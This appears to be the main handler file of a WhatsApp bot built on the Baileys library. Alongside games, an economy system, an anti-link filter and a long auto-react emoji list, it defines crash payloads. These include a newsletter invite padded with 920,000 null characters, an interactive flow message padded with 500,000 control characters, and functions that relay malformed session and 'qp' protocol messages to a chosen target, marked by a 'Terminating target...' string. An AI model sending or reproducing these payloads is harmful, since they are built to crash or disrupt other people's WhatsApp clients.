
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const fetch = require('node-fetch');
const qrcode = require('qrcode');
const axios = require('axios')
const { uploadToImgur } = require('./lib/davidcyriltech');
const crypto = require('crypto')
const { exec } = require("child_process")
const chalk = require('chalk')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const path = require('path');
const speed = require('performance-now')
const moment = require('moment-timezone');
const cheerio = require('cheerio');
const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'

const tempMailData = {};

const {
            beta1,
            beta2,
            buk1
        } = require("./lib/hdr.js")
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const qs = require('qs');

module.exports = async (David, m) => {
try {
const from = m.key.remoteJid
const body = (
    m?.mtype === 'conversation' ? m?.message.conversation :
    m?.mtype === 'imageMessage' ? m?.message.imageMessage.caption :
    m?.mtype === 'videoMessage' ? m?.message.videoMessage.caption :
    m?.mtype === 'extendedTextMessage' ? m?.message.extendedTextMessage.text :
    m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
    m?.mtype === 'listResponseMessage' ? m?.message.listResponseMessage.singleSelectReply.selectedRowId :
    m?.mtype === 'templateButtonReplyMessage' ? m?.message.templateButtonReplyMessage.selectedId :
    m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
    m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
    m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
);





const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc') 



const restrictedTargets ='2349066528353'

const budy = (typeof m.text == 'string' ? m.text : '')
const botNumber = await David.decodeJid(David.user.id)
const groupMetadata = m?.isGroup ? await David.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;

const qsal = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363315231436175@newsletter',
    newsletterName: '',
    caption: `${global.anitav4} | 2024 - 2099`
}}}

const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
const isGroup = m.key.remoteJid.endsWith('@g.us')

if (!global.prefix) global.prefix = '.';

const prefix = global.prefix;
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (David.user.id.split(':')[0]+'@s.whatsapp.net' || David.user.id) : (m.key.participant || m.key.remoteJid)

function isSudoUser(jid) {
    return global.sudoUsers.includes(jid) || jid === global.owner + "@s.whatsapp.net";
}


/// Economy 

// Load economy data
function loadEconomy() {
    if (fs.existsSync("./david-cyril/economy.json")) {
        const data = fs.readFileSync("./david-cyril/economy.json");
        return JSON.parse(data);
    }
    return {}; // Return empty object if file doesn't exist
}

// Save economy data
function saveEconomy(data) {
    fs.writeFileSync("./david-cyril/economy.json", JSON.stringify(data, null, 2));
}

// Economy data initialization
let economy = loadEconomy();

// Load levels from JSON
function loadLevels() {
    if (fs.existsSync("database/level.json")) {
        const data = fs.readFileSync("database/level.json");
        return JSON.parse(data);
    }
    return {}; // Return empty object if file doesn't exist
}

// Save levels to JSON
function saveLevels(data) { 
    fs.writeFileSync("./david-cyril/level.json", JSON.stringify(data, null, 2));
}

let userLevels = loadLevels();




function loadPets() {
    if (fs.existsSync("./david-cyril/pets.json")) {
        const data = fs.readFileSync("./david-cyril/pets.json");
        return JSON.parse(data);
    }
    return {};
}

function savePets(data) {
    fs.writeFileSync("./david-cyril/pets.json", JSON.stringify(data, null, 2));
}

let pets = loadPets();

let lotteryPot = 0;
let lotteryParticipants = [];

function loadGuardPets() {
    if (fs.existsSync("./david-cyril/guardPets.json")) {
        const data = fs.readFileSync("./david-cyril/guardPets.json");
        return JSON.parse(data);
    }
    return {};
}

function saveGuardPets(data) {
    fs.writeFileSync("./david-cyril/guardPets.json", JSON.stringify(data, null, 2));
}

let guardPetsData = loadGuardPets();

// Add a function to randomly pick a winner after a set time
function pickLotteryWinner() {
    if (lotteryParticipants.length > 0) {
        const winner = lotteryParticipants[Math.floor(Math.random() * lotteryParticipants.length)];
        economy[winner].wallet += lotteryPot;
        saveEconomy(economy);

        reply(`🎉 *Lottery Winner!*\n\n@${winner.split("@")[0]} won the pot of $${lotteryPot}!\n\n💰 *Wallet Balance:* $${economy[winner].wallet}`, {
            mentions: [winner],
        });

        // Reset lottery
        lotteryPot = 0;
        lotteryParticipants = [];
    }
}


function loadWeapons() {
    if (fs.existsSync("./david-cyril/./david-cyril/weapons.json")) {
        const data = fs.readFileSync("./david-cyril/weapons.json");
        return JSON.parse(data);
    }
    return {};
}

function saveWeapons(data) {
    fs.writeFileSync("./david-cyril/weapons.json", JSON.stringify(data, null, 2));
}

let weaponsData = loadWeapons();


function wcgNextTurn() {
    if (wcgSession.players.length <= 1) {
        reply(`🎉 *WCG Game Over!*\n\n🏆 The winner is @${wcgSession.players[0].split("@")[0]}!`, {
            mentions: wcgSession.players,
        });

        wcgSession.active = false;
        saveWCGSession(wcgSession);
        return;
    }

    const player = wcgSession.players[wcgSession.currentTurn];
    const letter = String.fromCharCode(65 + Math.floor(Math.random() * 26)); // Random letter (A-Z)

    reply(`🎲 @${player.split("@")[0]}, tell me a ${wcgSession.wordLength}-letter word that starts with "${letter}".\nYou have ${wcgSession.timer / 1000} seconds!`, {
        mentions: [player],
    });

    const timeout = setTimeout(() => {
        reply(`❌ @${player.split("@")[0]} failed to respond in time and has been eliminated!`, {
            mentions: [player],
        });

        // Eliminate player and adjust game
        wcgSession.players.splice(wcgSession.currentTurn, 1);
        wcgAdjustGame();
        wcgNextTurn();
    }, wcgSession.timer);

    David.ev.once("messages.upsert", async (messageEvent) => {
        const { messages } = messageEvent;
        const response = messages[0].message.conversation;

        if (messages[0].key.remoteJid !== player || !response) return;

        clearTimeout(timeout); // Cancel elimination timer

        if (response.length === wcgSession.wordLength && response.toLowerCase().startsWith(letter.toLowerCase())) {
            reply(`✅ @${player.split("@")[0]}, correct!`, { mentions: [player] });
            wcgSession.currentTurn = (wcgSession.currentTurn + 1) % wcgSession.players.length; // Move to next turn
            saveWCGSession(wcgSession);
            wcgNextTurn();
        } else {
            reply(`❌ @${player.split("@")[0]}, wrong answer! Eliminated.`, { mentions: [player] });
            wcgSession.players.splice(wcgSession.currentTurn, 1); // Eliminate player
            wcgAdjustGame();
            wcgNextTurn();
        }
    });
}

// Adjust game difficulty as players are eliminated
function wcgAdjustGame() {
    if (wcgSession.players.length <= 3) {
        wcgSession.wordLength = Math.min(7, wcgSession.wordLength + 1); // Increase word length (max 7)
        wcgSession.timer = Math.max(30000, wcgSession.timer - 10000); // Decrease timer (min 30s)
        saveWCGSession(wcgSession);
    }
}



function loadWCGSession() {
    if (fs.existsSync('./david-cyril/wcg.json')) {
        return JSON.parse(fs.readFileSync('./david-cyril/wcg.json'));
    }
    return { active: false, players: [], currentTurn: 0, wordLength: 3, timer: 60000 };
}

function saveWCGSession(session) {
    fs.writeFileSync('./david-cyril/wcg.json', JSON.stringify(session, null, 2));
}

let wcgSession = loadWCGSession();






function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}




const reply = (teks) => { 
    const thumbnail = fs.readFileSync('./thumb.png'); // Read the thumbnail image

    David.sendMessage(from, { 
        text: teks, 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: channelname,
                newsletterJid: channeljid,
            }, 
            externalAdReply: { 
                showAdAttribution: true,
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,
                title: `${global.anitav4} || ${global.channelname}`,
                sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`, 
                thumbnail: thumbnail, // Use the loaded thumbnail image
            }
        }
    }, { quoted: qsal });
}








const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''




const frommeky = m.key.remoteJid    
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const input = m.isMention && m.quoted && m.mentionedJid.includes(m.quoted.sender) ? m.mentionedJid : m.isMention && m.quoted ? [...m.mentionedJid, m.quoted.sender] : m.isMention ? m.mentionedJid : m.quoted ? Array(m.quoted.sender) : text !== "" && (text.trim().includes("08") || text.trim().includes("+62") || text.trim().includes("628")) ? text.split("+62").filter((x) => (x !== "" && x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.trim().startsWith("8") ? ("+62" + x.trim()) : x.trim()).join(" ").split(" ").filter((x) => (x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.startsWith("08") ? parseInt(x.replace("08", "628")) : parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))).map((x) => (x + "@s.whatsapp.net")) : text !== "" && !isNaN(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))) && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length >= 8 && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length <= 15 ? Array(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), "")) + "@s.whatsapp.net") : []
const isMedia = /image|video|sticker|audio/.test(mime)

try {
ppusers = await David.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppusers = 'https://files.catbox.moe/0arg0u.jpg'
}
ppnyausers = await getBuffer(ppusers)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: 0,
}
} catch (err) {
console.log(err)
} 


async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
            var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
                'sessionStructure': {
                    'sessionVersion': sessionVersion,
                    'localIdentityPublic': localIdentityPublic,
                    'remoteIdentityPublic': remoteIdentityPublic,
                    'rootKey': rootKey,
                    'previousCounter': previousCounter,
                    'senderChain': senderChain,
                    'receiverChains': receiverChains,
                    'pendingKeyExchange': pendingKeyExchange,
                    'pendingPreKey': pendingPreKey,
                    'remoteRegistrationId': remoteRegistrationId,
                    'localRegistrationId': localRegistrationId,
                    'needsRefresh': needsRefresh,
                    'aliceBaseKey': aliceBaseKey
                }
            }), {
                userJid: target
            });

            await David.relayMessage(target, sessionStructure.message, {
                participant: {
                    jid: target
                },
                messageId: sessionStructure.key.id
            });
        }
        
 const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
async function NewsletterZap(LockJids) {
            var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        "newsletterAdminInviteMessage": {
                            "newsletterJid": `120363298524333143@newsletter`,
                            "newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
                            "jpegThumbnail": "",
                            "caption": `𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒`,
                            "inviteExpiration": Date.now() + 1814400000
                        }
                    }
                }
            }), {
                'userJid': LockJids
            });
            await David.relayMessage(LockJids, messageContent.message, {
                'participant': {
                    'jid': LockJids
                },
                'messageId': messageContent.key.id
            });
        }
        
                                        async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
            var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
                'qp': {
                    'filter': {
                        'filterName': filterName,
                        'parameters': parameters,
                        'filterResult': filterResult,
                        'clientNotSupportedConfig': clientNotSupportedConfig
                    },
                    'filterClause': {
                        'clauseType': clauseType,
                        'clauses': clauses,
                        'filters': filters
                    }
                }
            }), {
                userJid: target
            });

            await David.relayMessage(target, qpMessage.message, {
                participant: {
                    jid: target
                },
                messageId: qpMessage.key.id
            });
        }
        
                    
                                            
        
        

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppusers, 300, 300)

    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

    const createSerial = (size) => {
    return crypto.randomBytes(size).toString('hex').slice(0, size)
}
if (global.public === false) {
if (!m.key.fromMe && !isCreator) return
}


// Antilink Protection
if (global.antilink || global.antilinkkick || global.antilinkwarn) {
    if (/https?:\/\/[^\s]+/i.test(budy)) { // Matches any URL
        if (!isBotAdmins) return; // Ensure bot is admin
        if (isAdmins || isCreator) return; // Skip for admins/owner

        // Delete the message
        try {
            await David.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
        } catch (err) {
            console.log('Failed to delete message:', err);
        }

        if (global.antilinkkick) {
            // Warn and kick the sender
            try {
                await David.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}, posting links is not allowed in this group!`,
                    mentions: [m.sender]
                });
                await David.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            } catch (err) {
                console.log('Failed to kick participant:', err);
            }
        } else if (global.antilinkwarn) {
            // Just warn the sender
            try {
                await David.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Do not send links in this group!`,
                    mentions: [m.sender]
                });
            } catch (err) {
                console.log('Failed to send warning:', err);
            }
        }
    }
}



  //unavailable
         if (global.autoreadmessages) {
        	if (m.message) { 
            David.readMessages([m.key])
        }
       } 
        
        if (global.unavailable) {
        	if (m.message) { 
        	David.sendPresenceUpdate('unavailable', m.chat)
        }
       } 	
 	
 if (global.autoRecord) {
      if (m.message) {
        David.sendPresenceUpdate("recording", m.chat);
      }
    }

    if (global.autoTyping) {
      if (m.message) {
        David.sendPresenceUpdate("composing", m.chat);
      }
    }

    if (global.available) {
      if (m.message) {
        David.sendPresenceUpdate("available", m.chat);
      }
    }
    
    
if (global.autoreact) {   
if (m.message) {
  try {
    // Array of random emojis
    const emojis = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸",
"📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑",
"👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿",
"🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆",
"🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜",
"🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐",
"🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣",
"🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮",
"🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️",
"🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱",
"👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️",
"💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻",
"📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧",
"🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻",
"👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼",
"🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟",
"🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛",
"🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵",
"🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪",
"🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀",
"🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽",
"🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️",
"👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫",
"👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝",
"📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷",
"🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸",
"🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁",
"🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇",
"🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝",
"🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹",
"🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥",
"🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯",
"🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺",
"🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️",
"💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨",
"👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝",
"😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌",
"😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔",
"🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩",
"🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂",
"📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔",
"❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦",
"🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭",
"👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴",
"🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥",
"🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾",
"🏀", "🏈", "🎯", "🏆", "🎲", "⬆️", "⬇️", "⇒", "⇐", "↩️",
"↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵",
"🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️",
"🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️",
"💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️",
"💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️",
"👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪",
"👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉",
"📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬",
"📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨",
"🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂",
"🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱",
"🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺",
"💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦",
"👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉",
"📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️",
"📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫",
"👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽",
"🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄",
"🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙",
"🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿",
"🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿",
"🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵",
"🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲",
"📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠",
"🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬",
"🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩",
"🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨",
"🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴",
"🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌",
"🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟",
"🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫",
"🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬",
"🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧",
"🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻",
"👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼",
"🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟",
"🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛",
"🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵",
"🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩",
"🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁",
"🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫",
"🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃",
"🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪",
"👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊",
"📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸",
"📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑",
"👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿",
"🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠",
"🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌",
"🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊",
"🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎",
"🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖",
"🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘",
"🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️",
"🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨",
"🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦",
"🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚",
"🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖",
"🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃",
"😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚",
"😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭",
"🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒",
"🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷",
"🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫",
"🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁",
"☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰",
"😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫",
"🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩",
"🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹",
"😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋",
"💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️",
"💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎",
"🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣",
"💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋",
"🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈",
"👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛",
"🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳",
